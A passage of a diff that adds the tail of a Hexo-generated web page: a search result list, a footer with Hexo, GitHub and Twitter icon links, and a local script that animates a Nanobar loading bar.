+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
+  
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
+        </a>
+        
+        at <a href="https://en.wikipedia.org/wiki/Earth" target="_blank" rel="noreferrer">Earth</a>.</p>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/Mykonos-x" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/mykonos_x" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+
+      
+
+    </div>
+  
+</div>
+
+      </div>
+
+    </div>
+
+  </div>
+  <script src="/js/nanobar.min.js"></script>
+
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
+
+</body>
+
+</html>
